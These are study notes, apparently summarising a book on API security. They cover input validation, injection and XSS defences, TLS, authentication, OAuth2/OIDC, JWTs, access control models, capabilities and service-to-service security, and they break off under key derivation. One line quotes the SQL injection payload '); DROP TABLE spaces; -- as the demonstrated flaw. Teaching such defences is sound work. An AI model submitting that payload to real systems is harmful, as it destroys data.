### API Security

#### Secure API Development



Main Idea

&nbsp;	• Build the API on a secure-by-default foundation: clean project scaffolding, tight DB usage, strict input validation, and output hardening. Stop entire vulnerability classes early (SQLi, XSS, ReDoS), then layer advanced controls later.

&nbsp;	• Example app \& stack (Natter)

&nbsp;		○ Endpoints (REST/JSON over HTTP):

&nbsp;			• POST /spaces (create space)

&nbsp;			• POST /spaces/{id}/messages, GET /spaces/{id}/messages\[?since=], GET /spaces/{id}/messages/{msgId} 

&nbsp;			• Moderator: DELETE /spaces/{id}/messages/{msgId}

&nbsp;		○ Tech: Java 11, Spark (HTTP), H2 (in-mem), Dalesbred (DB), json.org (JSON), Maven.

&nbsp;		○ Pattern: Controllers hold core logic; Spark routes + filters handle HTTP/security.

&nbsp;	• Secure development fundamentals

&nbsp;		○ Three-phase handler: parse → operate → respond (separate concerns, easier to secure \& test).

&nbsp;		○ Filters: before (validate inputs), after (set types), afterAfter (headers for all responses, incl. errors).

&nbsp;		○ Avoid info leaks: don’t expose stack traces, framework versions (e.g., blank out Server).

&nbsp;	• Injection attacks (and the fix)

&nbsp;		○ What went wrong: string-built SQL with user input ⇒ SQL injection (demonstrated '); DROP TABLE spaces; --).

&nbsp;		○ Primary defense: prepared/parameterized statements everywhere (placeholders ?, values bound separately).

&nbsp;		○ Secondary containment: DB least privilege user (only SELECT, INSERT), so even if SQLi appears, blast radius is small.

&nbsp;		○ Don’t rely on escaping; it’s brittle across engines/versions.

&nbsp;	• Input validation (allowlist mindset)

&nbsp;		○ Validate size, type, charset, format before using data or touching the DB.

&nbsp;		○ Prefer allowlists (e.g., username regex \[A-Za-z]\[A-Za-z0-9]{1,29}) over blocklists.

&nbsp;		○ Watch for ReDoS: design regexes to avoid catastrophic backtracking; use simple checks when in doubt.

&nbsp;		○ Note: even with memory-safe languages, attackers can force resource exhaustion (e.g., huge arrays).

&nbsp;	• Output hardening \& XSS prevention

&nbsp;		○ Problem demo: reflected XSS via text/plain form trick, incorrect Content-Type, and echoing user input in error JSON.

&nbsp;		○ Defenses:

&nbsp;			• Enforce request media type: reject non-application/json bodies with 415.

&nbsp;			• Always set response type explicitly: application/json; charset=utf-8.

&nbsp;			• Never echo unsanitized input in errors; prefer generic messages or sanitize first.

&nbsp;			• Generate JSON via library, not by string concatenation.

&nbsp;	• Security headers to set on every response

&nbsp;		○ X-Content-Type-Options: nosniff – stop MIME sniffing (prevents JSON treated as HTML/JS).

&nbsp;		○ X-Frame-Options: DENY (and/or CSP frame-ancestors 'none') – mitigate clickjacking/data drag.

&nbsp;		○ X-XSS-Protection: 0 – disable legacy, unsafe browser XSS auditors on API responses.

&nbsp;		○ Cache-Control: no-store (+ proper Expires/Pragma as needed) – avoid sensitive data caching.

&nbsp;		○ Minimal CSP for APIs:

Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; sandbox

&nbsp;	• Error handling

&nbsp;		○ Map validation/parse issues to 400, missing records to 404, unexpected to 500; all in JSON; no stack traces.

&nbsp;	• Quick checklist you can reuse

&nbsp;		○ Scaffold API with controllers + Spark filters (or equivalent) to isolate security concerns.

&nbsp;		○ TLS (chapter 3), but now: enforce Content-Type: application/json on request; set correct response type.

&nbsp;		○ Prepared statements only; no string-built SQL.

&nbsp;		○ Run the app as a restricted DB user (POLA).

&nbsp;		○ Validate inputs (length, charset, format); design regexes to avoid ReDoS.

&nbsp;		○ Never echo raw input in errors; sanitize or generalize.

&nbsp;		○ Set nosniff / frame / CSP / cache headers on every response.

&nbsp;		○ Use JSON libraries for output; avoid manual string concatenation.

&nbsp;		○ Centralize exception → HTTP status mapping; keep responses minimal.

&nbsp;		○ Regularly re-test with “weird” inputs (quotes, long strings, mismatched media types).

#### Securing The Natter API



Main Idea

&nbsp;	• Harden the API by adding five security controls—rate-limiting, HTTPS/TLS, authentication, audit logging, and access control—placed in the right order so they collectively block STRIDE threats while preserving accountability.

&nbsp;	• Threats → controls (STRIDE map)

&nbsp;		○ Spoofing → Authentication (HTTP Basic)

&nbsp;		○ Tampering / Info disclosure → HTTPS/TLS (encrypt in transit)

&nbsp;		○ Repudiation → Audit logging (before and after each request)

&nbsp;		○ Denial of service → Rate-limiting (first gate)

&nbsp;		○ Elevation of privilege → Access control (ACLs + careful grant rules)

&nbsp;	• Implementation blueprint (in request order)

&nbsp;		○ Rate-limit early (e.g., Guava RateLimiter) → return 429 (+ Retry-After).

&nbsp;		○ Authenticate (don’t halt here—populate request.attribute("subject")).

&nbsp;		○ Audit log request start (assign audit\_id) and end (with status).

&nbsp;		○ Authorize (filters that enforce required perms per route) → 401 if unauthenticated (send WWW-Authenticate), 403 if authenticated but not allowed.

&nbsp;		○ Controller executes business logic.

&nbsp;	• Key concepts \& how to apply them

&nbsp;		○ Rate-limiting (availability)

&nbsp;			§ Apply before any heavy work (even before auth).

&nbsp;			§ Keep per-server limits beneath capacity; consider proxy/gateway limits too (defense in depth).

&nbsp;			§ Use 429 + Retry-After.

&nbsp;		○ Authentication (prevent spoofing)

&nbsp;			§ Use HTTP Basic for the chapter’s demo; credentials: Authorization: Basic <base64(user:pass)>.

&nbsp;			§ Only over HTTPS—Base64 is trivially decodable.

&nbsp;			§ Store passwords with Scrypt (or Argon2/Bcrypt/PBKDF2): unique salt, memory-hard params (e.g., 32768,8,1).

&nbsp;			§ Add /users registration endpoint that hashes \& stores pw\_hash.

&nbsp;		○ HTTPS/TLS (confidentiality \& integrity)

&nbsp;			§ Enable TLS in Spark (secure(...)); for dev, generate cert with mkcert (PKCS#12).

&nbsp;			§ Consider HSTS for real deployments (don’t set on localhost).

&nbsp;			§ Encrypt in transit now; chapter 5 covers at rest.

&nbsp;		○ Audit logging (accountability)

&nbsp;			§ Log attempted and successful actions: method, path, user, status, time, audit\_id (to correlate start/end).

&nbsp;			§ Write to durable storage (DB here; SIEM in prod).

&nbsp;			§ Follows separation of duties: access to logs should be restricted and distinct from admins.

&nbsp;		○ Access control (authorization)

&nbsp;			§ Model as ACLs per space (r, w, d), persisted in a permissions table.

&nbsp;			§ Enforce via route-specific filters (factory requirePermission(method, perm)):

&nbsp;				□ 401 when not authenticated; 403 when authenticated but lacking perms.

&nbsp;			§ Privilege escalation fix: only owners/moderators (rwd) can add members, or ensure granted perms ⊆ grantor’s perms.

&nbsp;	• Practical gotchas \& defaults

&nbsp;		○ Auth stage should not short-circuit; let access control reject so the attempt is logged.

&nbsp;		○ Return the right codes: 401 + WWW-Authenticate vs 403.

&nbsp;		○ Keep least privilege at the DB (from Ch.2) and at the app (minimal perms).

&nbsp;		○ Prefer defense in depth (proxy + app rate-limits; TLS + app checks).

&nbsp;	• Quick checklist to apply

&nbsp;		○ Global RateLimiter before everything → 429/Retry-After.

&nbsp;		○ Basic auth decoder → set subject if valid (Scrypt verify).

&nbsp;		○ Two audit filters (start/end) using audit\_id.

&nbsp;		○ Per-route before() filters enforcing ACL perms; correct 401/403 semantics.

&nbsp;		○ TLS on; consider HSTS in prod; never --insecure.

&nbsp;		○ Registration endpoint with input validation and Scrypt hashing.

&nbsp;		○ Member-add rule that avoids privilege escalation.

#### OAuth2 and OpenID Connect



Main Idea

&nbsp;	• Open your API to third-party apps safely by using OAuth2 for delegated authorization with scoped access tokens, validate those tokens securely (introspection or JWTs), and use OpenID Connect (OIDC) when you also need user identity/SSO.

&nbsp;	• Core Terms \& Roles

&nbsp;		○ AS (Authorization Server): Authenticates users, issues tokens.

&nbsp;		○ RS (Resource Server / your API): Consumes tokens.

&nbsp;		○ Client: The app requesting access (public or confidential).

&nbsp;		○ RO (Resource Owner): The end user.

&nbsp;		○ Access token: Grants API access.

&nbsp;		○ Refresh token: Lets a client get new access tokens without user re-auth.

&nbsp;		○ Scope(s): String labels that limit what the token can do.

&nbsp;	• Scopes vs permissions

&nbsp;		○ Scopes (DAC): What a user consents to delegate to a client (“post\_message”, “read\_messages”). Client-facing, coarse to fine as needed.

&nbsp;		○ Permissions (MAC or DAC): Admin-designed rights to specific resources/objects (ACLs, roles). Scopes say which operations may be called; permissions also constrain which objects.

&nbsp;	• Client types

&nbsp;		○ Public: Browser SPA, mobile, desktop—can’t keep a secret.

&nbsp;		○ Confidential: Server-side—can authenticate to AS (client secret/JWT/TLS).

&nbsp;	• Grant types (what to use)

&nbsp;		○ Use: Authorization Code + PKCE (for web, SPA, mobile, desktop).

&nbsp;		○ Avoid: Implicit (token leaks) and ROPC (shares password with app).

&nbsp;		○ Others: Client Credentials (service→service), Device flow (no UI).

&nbsp;	• Authorization Code + PKCE flow (essentials)

&nbsp;		○ Client redirects to /authorize with scope, state, PKCE code\_challenge.

&nbsp;		○ AS authenticates user, shows consent, returns code (+ state).

&nbsp;		○ Client posts code (+ code\_verifier) to /token → gets access token (and often refresh token).

&nbsp;		○ Use Authorization: Bearer <token> to call the API.

&nbsp;		○ PKCE: Always on. Stops code interception by requiring a matching code\_verifier.

&nbsp;	• Redirect URIs (security)

&nbsp;		○ Prefer claimed HTTPS redirects (App/Universal Links).

&nbsp;		○ Private URI schemes are weaker (can be hijacked).

&nbsp;		○ CLI/desktop: use loopback http://127.0.0.1:<random>.

&nbsp;	• Validating access tokens (at the API)

&nbsp;		○ Two mainstream options:

&nbsp;			§ Token Introspection (RFC 7662): RS POSTs token to AS /introspect → gets active, sub, scope, exp, etc.

&nbsp;				□ Pros: central control/revocation; RS doesn’t need keys.

&nbsp;				□ Cons: network hop per check (cache carefully).

&nbsp;			§ JWT access tokens: RS validates locally.

&nbsp;				□ Prefer public-key signatures (AS signs with private key; RS verifies with public key from JWK Set). Enforce expected issuer, audience, alg.

&nbsp;				□ Handle scope claim variants (string vs array).

&nbsp;				□ Pros: no network call; scalable. Cons: key rotation/JWK fetching; larger tokens.

&nbsp;	• Crypto choices \& TLS hardening

&nbsp;		○ Signature algs (JWS): Prefer EdDSA (Ed25519) if supported; else ES256; avoid RSA PKCS#1 v1.5 if possible (prefer RSASSA-PSS).

&nbsp;		○ Encrypted tokens (JWE): Only when you must hide claims from clients; prefer ECDH-ES over RSA-OAEP; never RSA1\_5.

&nbsp;		○ TLS to AS: Pin trust to your org CA, allow only TLS 1.2/1.3 and modern ciphers.

&nbsp;	• Refresh tokens

&nbsp;		○ Let you issue short-lived access tokens.

&nbsp;		○ Client uses /token with grant\_type=refresh\_token.

&nbsp;		○ AS can rotate refresh tokens to detect theft.

&nbsp;	• Revocation

&nbsp;		○ OAuth revocation endpoint: Only the client that owns the token can revoke.

&nbsp;		○ For RS-side checks, rely on introspection (or short TTL + refresh).

&nbsp;	• Single sign-on (SSO)

&nbsp;		○ Centralize auth at the AS; browser session at AS enables seamless re-auth across clients.

&nbsp;	• OpenID Connect (OIDC)

&nbsp;		○ Adds identity to OAuth:

&nbsp;			§ ID token (JWT): who the user is + how/when they authenticated (e.g., auth\_time, amr, acr, nonce).

&nbsp;			§ UserInfo endpoint: detailed profile claims via access token.

&nbsp;		○ Do not use ID tokens for API access (not scoped; wrong audience). Use access tokens for authorization; ID tokens for identity/assurance.

&nbsp;		○ If a client passes an ID token to your API, accept it only alongside a valid access token and verify issuer, audience, azp, subject match.

&nbsp;	• Design \& implementation tips

&nbsp;		○ Require a scope to obtain scoped tokens (avoid privilege escalation).

&nbsp;		○ Pre-register redirect URIs; validate state; always use PKCE.

&nbsp;		○ Enforce audience on tokens so a token for API A can’t be replayed to API B.

&nbsp;		○ Handle username mapping (sub/username) between AS and your user store (LDAP/DB).

&nbsp;		○ Avoid compression of encrypted content unless you understand the side-channel risks.

&nbsp;	• Common pitfalls to avoid

&nbsp;		○ Using implicit or ROPC for third-party apps.

&nbsp;		○ Trusting JWT alg/jku/jwk headers blindly.

&nbsp;		○ Treating an ID token like an access token.

&nbsp;		○ No revocation plan (or caching introspection too long).

&nbsp;		○ Weak redirect URI strategy (open redirects, unclaimed schemes).

#### Modern Token-Based Authentication



Main Idea

&nbsp;	• Move beyond same-site session cookies to a modern, cross-origin, token-based setup:

&nbsp;		○ enable CORS correctly,

&nbsp;		○ send tokens with the Bearer HTTP scheme,

&nbsp;		○ store tokens client-side with Web Storage (not cookies),

&nbsp;		○ and harden server-side token storage (DB hashing + HMAC, cleanup, least privilege).

&nbsp;	• Key concepts (what \& why)

&nbsp;		○ CORS: lets specific cross-origin requests through SOP using preflights (OPTIONS).

&nbsp;			§ Preflight sends Origin, Access-Control-Request-Method/Headers.

&nbsp;			§ Server echoes allowed values via:

&nbsp;				• Access-Control-Allow-Origin (single origin; add Vary: Origin)

&nbsp;				• Access-Control-Allow-Methods, …-Headers, optional …-Max-Age

&nbsp;				• Access-Control-Allow-Credentials: true when you want cookies or TLS client certs.

&nbsp;			§ Cookies + CORS: must send …-Allow-Credentials: true on both preflight and actual response and client must set fetch(..., { credentials: 'include' }).

&nbsp;			§ SameSite vs CORS: SameSite cookies don’t ride on true cross-site requests; future favors non-cookie tokens for cross-origin.

&nbsp;		○ Tokens without cookies

&nbsp;			§ Server-side: DatabaseTokenStore with token\_id, user\_id, expiry, attributes (JSON).

&nbsp;				• Generate IDs with SecureRandom (e.g., 20 bytes → Base64url ≈ 160 bits).

&nbsp;				• Expiry deletion task + index on expiry.

&nbsp;			§ Wire format: use Authorization: Bearer <token>; advertise with WWW-Authenticate: Bearer (e.g., error="invalid\_token" when expired).

&nbsp;			§ Client-side: store token in localStorage (persists across tabs/restarts) and send it in the Authorization header. No credentials: 'include'.

&nbsp;				• Remove CSRF header/logic when not using cookies.

&nbsp;		○ Security hardening

&nbsp;			§ CSRF goes away with non-cookie tokens (browser no longer auto-attaches creds).

&nbsp;			§ XSS risk increases (Web Storage is JS-accessible). Prioritize XSS defenses:

&nbsp;				• strict output encoding, CSP, consider Trusted Types.

&nbsp;			§ Protect tokens at rest:

&nbsp;				• Hash tokens before DB write (e.g., SHA-256); compare using constant-time equality.

&nbsp;				• Add HMAC-SHA-256 tag to tokens issued to clients: tokenId.tag.

&nbsp;					® Validate tag (constant-time) before DB lookup; strip tag, then look up.

&nbsp;					® Store HMAC key in a keystore (e.g., PKCS#12), load on startup; don’t hard-code or keep in the same DB.

&nbsp;				• DB hygiene:

&nbsp;					® Least-privilege accounts; split duties (e.g., CQRS: different users for queries vs destructive ops).

&nbsp;					® Consider row-level security where supported.

&nbsp;					® Encrypt backups; application-level encryption for highly sensitive attributes is complex—use with care.

&nbsp;	• Implementation checklist

&nbsp;		○ CORS filter

&nbsp;			§ Echo exact origin; add Vary: Origin.

&nbsp;			§ Allow needed methods/headers (e.g., Content-Type, Authorization).

&nbsp;			§ Only use …-Allow-Credentials: true if you truly need cookies; otherwise omit it.

&nbsp;		○ Auth flow

&nbsp;			§ POST /sessions → create random token, store in DB, return token.

&nbsp;			§ Client saves token to localStorage; sends Authorization: Bearer … on API calls.

&nbsp;			§ DELETE /sessions revokes (delete by id/hash).

&nbsp;			§ Return WWW-Authenticate: Bearer on 401s; invalid\_token when expired.

&nbsp;		○ Token store hardening

&nbsp;			§ Generate with SecureRandom.

&nbsp;			§ Store hash(tokenId) in DB; schedule expired token cleanup.

&nbsp;			§ Wrap store with HMAC validator (key from keystore).

&nbsp;	• When to choose what

&nbsp;		○ Same-origin web app: session cookies + SameSite + CSRF defenses (Ch. 4) still great.

&nbsp;		○ Cross-origin web, mobile, desktop, SPAs on other domains: Bearer + Web Storage + DB tokens with CORS; no cookies.

&nbsp;	• Smart defaults

&nbsp;		○ Bearer everywhere; Base64url for ids; SecureRandom only.

&nbsp;		○ No state-changing GETs.

&nbsp;		○ Constant-time comparisons (MessageDigest.isEqual).

&nbsp;		○ Keep CORS tight (allow specific origins) unless you truly need public access.

#### Self-Contained Tokens and JWTs



Main Idea

&nbsp;	• Scale beyond DB-backed sessions by making self-contained tokens (client holds the state) and securing them with integrity (HMAC/signatures) and, when needed, confidentiality (encryption). Use JWT/JOSE carefully, and add a revocation strategy since state lives client-side.

&nbsp;	• Key Concepts

&nbsp;		○ Self-contained (stateless) tokens

&nbsp;			§ Token == encoded claims (e.g., JSON) + protection.

&nbsp;			§ Pros: fewer DB hits, easy horizontal scale.

&nbsp;			§ Cons: revocation is hard; token contents leak unless encrypted.

&nbsp;		○ Integrity: HMAC / JWS

&nbsp;			§ Wrap your JSON token with HMAC-SHA-256 or sign as a JWS so it can’t be forged/modified.

&nbsp;			§ Validate with constant-time comparison; advertise failures via WWW-Authenticate only as needed.

&nbsp;		○ Confidentiality: Authenticated Encryption

&nbsp;			§ Use AEAD (e.g., AES-GCM or AES-CBC + HMAC (EtM)) or high-level libs (NaCl/SecretBox, Tink).

&nbsp;			§ Encrypt-then-MAC (or a single AEAD) → prevents tampering + chosen-ciphertext tricks.

&nbsp;			§ IV/nonce must be unique/unpredictable (generate via CSPRNG).

&nbsp;		○ JWT / JOSE essentials

&nbsp;			§ Structure (JWS Compact): base64url(header).base64url(payload).base64url(tag)

&nbsp;			§ Common claims:

&nbsp;				□ sub (subject), exp (expiry), iss (issuer), aud (audience), iat (issued at), nbf (not before), jti (JWT ID).

&nbsp;			§ Header pitfalls:

&nbsp;				□ Don’t trust alg from the token; bind algorithm to the key (key-driven agility).

&nbsp;				□ Use kid to look up server-held keys; avoid jwk/jku (key injection/SSRF risk).

&nbsp;			§ Encrypted JWTs (JWE): header + (optional) encrypted key + IV + ciphertext + tag. Prefer direct symmetric encryption (alg: "dir") with AEAD.

&nbsp;		○ Libraries, not hand-rolls

&nbsp;			§ Use a mature JOSE/JWT lib (e.g., Nimbus). Avoid DIY crypto/composition errors.

&nbsp;		○ Key management

&nbsp;			§ Separate keys by purpose (HMAC vs encryption). Store in a keystore, not code/DB. Support key rotation (kid).

&nbsp;		○ Revocation with stateless tokens

&nbsp;			§ Options:

&nbsp;				□ Allowlist in DB (only listed jti are valid).

&nbsp;				□ Blocklist of revoked jti until exp.

&nbsp;				□ Attribute-based invalidation (e.g., “all tokens for user X issued before T”).

&nbsp;				□ Short-lived access tokens + (later) refresh tokens (OAuth2 pattern).

&nbsp;			§ Hybrid approach (recommended default): JWT for integrity/confidentiality plus DB allowlist for revocation. Lets you skip DB for low-risk reads, check DB for sensitive ops.

&nbsp;		○ API design safety with types

&nbsp;			§ Use marker interfaces (e.g., ConfidentialTokenStore, AuthenticatedTokenStore, SecureTokenStore) so insecure combinations don’t compile.

&nbsp;		○ Compression caution

&nbsp;			§ Avoid JWE zip unless you truly need it (BREACH/CRIME-style side channels).

&nbsp;	• Quick implementation blueprint

&nbsp;		○ Create claims (sub, exp, optional iss, aud, jti, custom attrs).

&nbsp;		○ Protect:

&nbsp;			§ Integrity only → JWS (HS256) or HMAC wrapper.

&nbsp;			§ Integrity + confidentiality → JWE (e.g., A128CBC-HS256) or SecretBox.

&nbsp;		○ Keying: load from PKCS#12 keystore; bind alg to key; expose kid.

&nbsp;		○ Validate: parse, verify signature/tag, check aud, exp/nbf, then consume claims.

&nbsp;		○ Revoke: on logout/compromise, remove jti from allowlist (or add to blocklist).

&nbsp;	• Threats \& mitigations (STRIDE map)

&nbsp;		○ Spoofing/Tampering → HMAC/JWS/JWE (authenticated).

&nbsp;		○ Information disclosure → encrypt (JWE/SecretBox).

&nbsp;		○ Replay → short exp, enforce TLS, use jti tracking if needed.

&nbsp;		○ Config abuse → ignore alg header; never accept jwk/jku from tokens.

&nbsp;		○ Oracle/side channels → constant-time compares; generic error messages; be careful with CBC and compression.

&nbsp;	• When to choose what

&nbsp;		○ Small/medium scale, easy revocation → DB tokens (hashed + HMAC).

&nbsp;		○ High scale, cross-service → JWT (signed or encrypted) + allowlist.

&nbsp;		○ Simple single-service and you control both ends → NaCl/SecretBox tokens.

&nbsp;	• Common mistakes to avoid

&nbsp;		○ Trusting alg or fetching keys from jku.

&nbsp;		○ Using encryption without authentication.

&nbsp;		○ Reusing nonces/IVs.

&nbsp;		○ No revocation plan for stateless tokens.

&nbsp;		○ Hard-coding keys or storing them in the same DB as tokens.



#### Identity-Based Access Control



Main Idea

&nbsp;	• ACLs don’t scale. Move to identity-based access control (IBAC) patterns that organize “who can do what” using groups, roles (RBAC), and—when rules must be contextual and dynamic—attributes (ABAC). Centralize and automate policy where helpful, but keep it testable and manageable.

&nbsp;	• Key Concepts

&nbsp;		○ IBAC: Authorize based on who the authenticated user is.

&nbsp;		○ Groups: Many-to-many user collections (can be nested). Assigning perms to groups reduces ACL bloat and keeps members consistent.

&nbsp;			§ LDAP groups:

&nbsp;				• Static: groupOfNames / groupOfUniqueNames (explicit member).

&nbsp;				• Dynamic: groupOfURLs (membership via queries).

&nbsp;				• Virtual static: server-computed.

&nbsp;				• Lookups: search by DN, avoid LDAP injection (parametrized filters), cache results; some servers expose isMemberOf.

&nbsp;			§ RBAC: Map roles → permissions, then users → roles (not users → permissions).

&nbsp;				• Benefits: simpler reviews, separation of duties, app-specific roles, easier change control.

&nbsp;				• Sessions (NIST RBAC): a user activates only a subset of their roles → least privilege.

&nbsp;				• Static roles: stored assignments per scope/realm (e.g., per space).

&nbsp;				• Dynamic roles: time/shift-based or rule-based activation; less standardized; constraints (e.g., mutually exclusive roles) support separation of duties.

&nbsp;			§ RBAC implementation patterns:

&nbsp;				• Code annotations (e.g., @RolesAllowed).

&nbsp;				• Data-driven mapping (tables: role\_permissions, user\_roles)—transparent and admin-friendly.

&nbsp;				• Typical roles example: owner (rwd), moderator (rd), member (rw), observer (r).

&nbsp;			§ ABAC: Decide per request using four attribute sets:

&nbsp;				• Subject (user, groups, auth method, auth time)

&nbsp;				• Resource (object/URI, labels)

&nbsp;				• Action (HTTP method/operation)

&nbsp;				• Environment (time, IP, location, risk)

Combine rule outcomes (e.g., default-permit with deny overrides, or safer default-deny).

&nbsp;			§ Policy engines \& centralization:

&nbsp;				• Rule engines (e.g., Drools) or policy agents/gateways (e.g., OPA) to evaluate ABAC rules.

&nbsp;				• XACML architecture:

&nbsp;					® PEP (enforces), PDP (decides), PIP (fetches attributes), PAP (admin UI).

&nbsp;					® Enables central policy with distributed enforcement.

&nbsp;	• Design guidance (how)

&nbsp;		○ Layering strategy: Start with groups (org-level), organize API permissions with RBAC (app-specific), then ABAC for contextual constraints (time/location/risk)—defense in depth.

&nbsp;		○ Keep auth vs. authz layered: Gather identity/group claims during authentication; authorization logic consumes those attributes—avoids tight DB coupling and eases swapping in LDAP/OIDC.

&nbsp;		○ Data modeling tips:

&nbsp;			§ Use user\_roles + role\_permissions; cache per-request resolved permissions.

&nbsp;			§ Scope roles to a realm (e.g., a space/project).

&nbsp;		○ Rule combining: Choose and document defaults (default-deny is safest; if layering over RBAC, default-permit with deny-overrides can work).

&nbsp;		○ Operational best practices:

&nbsp;			§ Version control for policies; code review changes.

&nbsp;			§ Automated tests for endpoints and policy rules.

&nbsp;			§ Monitor performance of policy evaluation; cache derived attributes prudently.

&nbsp;	• Common pitfalls

&nbsp;		○ Assigning permissions directly to individual users (hard to audit).

&nbsp;		○ Mixing group lookups into every authorization query (breaks layering; harder to swap identity backends).

&nbsp;		○ Over-complex ABAC policies (hard to predict/maintain; brittle to data shape changes).

&nbsp;		○ Centralization that slows iteration → lingering overly broad access (least-privilege erosion).

&nbsp;	• Quick contrasts

&nbsp;		○ Groups vs Roles: Groups organize people (often org-wide). Roles organize permissions (app-specific). RBAC usually forbids user-direct perms; groups often don’t.

&nbsp;		○ RBAC vs ABAC: RBAC = stable, comprehensible entitlements; ABAC = contextual, fine-grained, dynamic control.

&nbsp;		



#### Capability-Based Security And Macaroons



Main Idea

&nbsp;	• Sometimes identity-based access control (IBAC/RBAC/ABAC) clashes with how people actually share things. Capability-based security fixes this by granting access with unforgeable, least-privilege references to specific resources (often as URLs). You can further harden capabilities with macaroons, which let anyone add verifiable, limiting caveats to a token.

&nbsp;	• Key Concepts

&nbsp;		○ Capability (cap): An unforgeable reference + the exact permissions to a single resource. Possession ⇒ authority (no ambient identity lookup).

&nbsp;		○ POLA, not ambient authority: Capabilities naturally enforce the Principle of Least Authority and avoid confused deputy bugs (e.g., CSRF) that arise from ambient credentials like cookies or IP checks.

&nbsp;		○ Capability URI (a.k.a. cap URL): A REST-friendly cap encoded in a URL.

&nbsp;			§ Token placement options \& trade-offs

&nbsp;				□ Path / query: simplest; but can leak via logs, Referer, history.

&nbsp;				□ Fragment (#…)/userinfo: not sent to server/Referer; safer for browsers but needs client JS to extract \& resend.

&nbsp;			§ HATEOAS with capabilities: Clients shouldn’t mint their own URIs. Server returns links that are themselves new capabilities (e.g., “messages” link from a “space” cap). This preserves POLA and keeps the client decoupled.

&nbsp;		○ Combining identity + capabilities:

&nbsp;			§ Auth (cookie/OIDC) proves who for audit/accountability.

&nbsp;			§ Capability proves may do what for this resource.

&nbsp;			§ Binding a cap to a user (store username in token \& require cookie match) thwarts CSRF and limits damage if a cap leaks; then you can drop a separate anti-CSRF token.

&nbsp;			§ To still share, add an endpoint that derives a new, possibly reduced-permission cap for another user.

&nbsp;		○ Macaroons: Capability tokens that support caveats (restrictions) anyone can append without server keys; integrity enforced via chained HMAC tags.

&nbsp;			§ First-party caveats: Checked locally by the API (e.g., time < ..., method = GET, since > ...). Great for contextual caveats added just before use to narrow risk (short time, specific method/URI).

&nbsp;			§ Third-party caveats: Require a discharge macaroon from an external service (e.g., “user is employee”, “transaction approved”). Enables decentralized, privacy-preserving authorization.

&nbsp;			§ Verification: API validates HMAC chain, then enforces each caveat with registered verifiers.

&nbsp;	• Practical patterns (Natter examples)

&nbsp;		○ Create caps: Use a secure token store; put resource path and perms in token attrs; return cap URIs (often multiple: rwd/rw/r).

&nbsp;		○ Authorize requests: Replace role lookups with a filter that reads the capability token, checks it matches the requested path, and applies perms.

&nbsp;		○ Linking flow: Responses include further cap links (HATEOAS) to subresources (e.g., /spaces/{id}/messages), preserving or reducing perms.

&nbsp;		○ Browser clients (web-keys): Put token in fragment; load a small JS page that extracts #token and re-sends it as a query param to the API. Beware redirects (fragments copy unless you supply a new one).

&nbsp;		○ Revocation/volume: Long-lived caps can bloat storage; mitigate with self-contained tokens (e.g., JWT) or by reusing existing equivalent caps; keep most caps short-lived.

&nbsp;	• Why this matters

&nbsp;		○ Security: Eliminates ambient authority paths for confused-deputy abuse; per-resource granularity makes over-privilege rarer.

&nbsp;		○ Usability: Matches how users share (“send a link”) while remaining safe.

&nbsp;		○ Composability: Macaroons let clients locally narrow tokens; third-party caveats enable policy checks without tight coupling.

&nbsp;	• Gotchas \& guidance

&nbsp;		○ Don’t leak caps (avoid logging full URLs; set strict Referrer-Policy; prefer fragment for browser-visible links).

&nbsp;		○ Clients can’t fabricate caps—you must return links.

&nbsp;		○ If you bind caps to users, you lose easy link-sharing; provide a server-mediated share/derive flow.

&nbsp;		○ Caveats must only restrict; never grant extra authority based on caveat claims.

&nbsp;		○ Test and version policy/caveat verifiers; treat tokens like secrets.

&nbsp;	• Quick contrasts

&nbsp;		○ Auth token vs Capability:

&nbsp;			§ Auth token ⇒ who you are, broad scope, short-lived.

&nbsp;			§ Capability ⇒ exact resource+perms, shareable, can be longer-lived.

&nbsp;		○ RBAC/ABAC vs Caps:

&nbsp;			§ RBAC/ABAC: identity-centric; good for broad policy \& org controls.

&nbsp;			§ Caps: object-centric; perfect for fine-grained, ad-hoc sharing; pair nicely with identity for audit.



#### Securing Service-To-Service APIs



Main Idea

&nbsp;	• How to authenticate and harden service-to-service API calls. It compares options (API keys, OAuth2 variants, JWT bearer, mutual TLS), explains proof-of-possession with certificate-bound tokens, and shows how to manage/rotate secrets (Kubernetes secrets, vaults/KMS, short-lived tokens, HKDF). It ends with ways to pass user context safely across microservices to avoid confused-deputy problems (phantom tokens, token exchange, macaroons).

&nbsp;	• Key Concepts

&nbsp;		○ API key / JWT bearer

&nbsp;			§ A long-lived bearer token that identifies a client app/org (not a user). Easy to issue/use; hard to revoke; anyone who steals it can use it until expiry. JWTs signed by a portal/AS make multi-API validation easy (public key verify) but are still bearer tokens.

&nbsp;		○ OAuth2 Client Credentials Grant

&nbsp;			§ Client gets an access token as itself (no user). Works with your existing AS, scopes, introspection \& revocation. Typically no refresh token (just ask again).

&nbsp;		○ Service account

&nbsp;			§ A “user-like” account for services, stored with users so APIs can do normal user lookups/roles. Commonly authenticated with non-interactive flows; ROPC works but is being deprecated—prefer stronger methods.

&nbsp;		○ JWT Bearer Grant (RFC 7523)

&nbsp;			§ Client proves identity or acts for a (service) account by presenting a signed JWT assertion. Pros: no long-lived shared secret, short expiry, public key distribution via JWK Set URL for easy rotation.

&nbsp;		○ Mutual TLS (mTLS) \& client certificates (RFC 8705)

&nbsp;			§ TLS on both sides: server and client authenticate with certs. Can be used to authenticate OAuth clients and to issue certificate-bound access tokens (see below). In Kubernetes:

&nbsp;				□ NGINX Ingress: request/verify client cert; forwards details via headers (e.g., ssl-client-verify, ssl-client-cert).

&nbsp;				□ Service mesh (e.g., Istio): does mTLS transparently between pods; forwards identity via X-Forwarded-Client-Cert (includes SANs/SPIFFE IDs). Useful to authenticate services without managing your own certs per service.

&nbsp;		○ Certificate-bound access tokens (PoP tokens)

&nbsp;			§ AS binds the token to the client cert (hash in cnf: { "x5t#S256": ... }). API only accepts the token over a TLS connection using the same cert. Stops token replay if stolen. API just compares the hash; doesn’t need full PKI validation.

&nbsp;		○ Secrets management

&nbsp;			§ Kubernetes Secrets: mount as files or env vars (prefer files). Easy but weaker: etcd needs at-rest encryption; anyone who can run a pod in the namespace can read them.

&nbsp;			§ Secret vaults / KMS: central encrypted storage, audit, fine-grained access, short-lived dynamic creds, crypto operations via service (e.g., PKCS#11). Use envelope encryption (DEK + KEK in KMS).

&nbsp;			§ Avoid long-lived secrets on disk: inject short-lived JWTs or one-time tokens into pods via a controller (separate, locked-down namespace) so pods exchange them for real access/refresh tokens at startup.

&nbsp;		○ Key derivation (HKDF)

